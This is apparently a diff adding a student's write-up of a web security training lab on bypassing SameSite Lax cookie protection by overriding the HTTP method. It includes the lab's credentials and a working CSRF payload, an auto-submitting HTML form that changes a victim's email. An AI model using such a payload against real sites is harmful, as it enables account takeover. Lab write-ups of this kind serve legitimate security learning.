@@ -1,0 +1,27 @@
+Lab #7 - SameSite Lax bypass via method override
+
+Vulnerability - This lab's change email function is vulnerable to CSRF.
+
+Goal - perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+Credentials - wiener:peter
+
+Analysis:
+- Log in with credentials wiener:peter and change email address
+- In request to change email address => change HTTP Method to GET => error: Method not allowed
+- See that SameSite is empty => this website is using default SameSite = Lax
+and in the form to change email do not include CSRF token
+- Try to override the method by make a request:
+/my-account/change-email?email=evil@gamil.com&_method=POST
+==> SUCCESSFULLY
+
+Solution:
+- Craft an HTML file and upload to exploit server
+<form action="https://0aba001003f21b4680ccb7a5001c00e4.web-security-academy.net/my-account/change-email" method="GET">
+    <input type="hidden" name="_method" value="POST">
+    <input type="email" name="email" value="evil@gamil1.com">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+
